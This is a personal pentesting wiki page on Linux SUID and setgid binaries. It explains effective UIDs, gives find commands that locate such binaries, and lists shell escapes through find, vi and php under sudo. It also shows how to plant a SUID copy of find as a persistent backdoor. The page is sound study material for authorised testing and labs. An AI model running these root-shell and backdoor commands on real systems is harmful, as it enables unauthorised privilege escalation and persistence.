---
title: Suid and Setgid Binaries
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Suid and Setgid Binaries

When a user or a system-automated script launches a process, it inherits the UID/GID of its initiating script: this is known as the real UID/GID. User passwords are stored as hashes within /etc/shadow, which is owned and writable only by root (uid=0). How, then, can non-privileged users access this file to change their own password?  To circumvent this issue, the effective UID/GID was introduced, which represents the actual value being checked when performing sensitive operations.


## Suid binaries

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. 

Resources: [https://gtfobins.github.io/](https://gtfobins.github.io/) contains a list of commands and how they can be exploited through "sudo". 

Equivalent to suid binaries in Windows would be: [LOLBAS](https://lolbas-project.github.io/)


```shell-session
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```


## Most used (by me)

### find

#### Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

```bash
find . -exec /bin/sh \; -quit
```

#### SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```bash
sudo install -m =xs $(which find) .

./find . -exec /bin/sh -p \; -quit
```

#### Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```bash
sudo find . -exec /bin/sh \; -quit
```

### vi

#### Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

```bash
#one way
vi -c ':!/bin/sh' /dev/null

# another way
vi
:set shell=/bin/sh
:shell
```
Used at [HTB machine Vaccine](htb-vaccine.md).


#### Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```bash
sudo vi -c ':!/bin/sh' /dev/null
```

### php

#### Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```



## Setgid Binaries

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. 

```shell-session
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```